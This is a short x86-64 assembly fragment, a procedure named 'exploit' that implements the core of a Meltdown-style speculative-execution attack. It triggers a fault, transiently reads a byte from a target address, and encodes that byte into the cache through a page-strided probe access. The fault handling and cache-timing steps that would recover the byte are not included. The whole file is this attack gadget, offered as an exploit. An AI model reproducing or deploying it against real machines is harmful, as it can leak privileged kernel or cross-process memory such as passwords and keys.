
.code
exploit proc

mov rax, qword ptr [0] ; raise an access violation exception
; Out of order execution starts.
retry:
movzx rcx, byte ptr [rcx] ; Read the data
shl rcx, 0Ch ; multiply rcx with the page size 4096
jz retry
mov rax, qword ptr [rcx+rdx] ; Push the data into cache

exploit endp
end